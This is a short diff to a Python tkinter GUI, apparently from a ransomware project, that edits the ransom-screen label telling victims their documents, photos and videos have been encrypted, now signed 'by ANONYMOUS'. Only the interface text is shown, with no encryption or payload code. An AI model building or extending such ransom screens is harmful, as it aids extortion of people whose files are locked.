@@ -165,7 +165,7 @@ def DECRYPT_FILE():
     #canvas1.create_window(width/2, height/4, window=label)
 
 
-    label1 = tk.Label(root, text='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.') # Title
+    label1 = tk.Label(root, text='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE Key by ANONYMOUS.') # Title
     label1.config(font=('helvetica', int(height/50)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*8, window=label1)
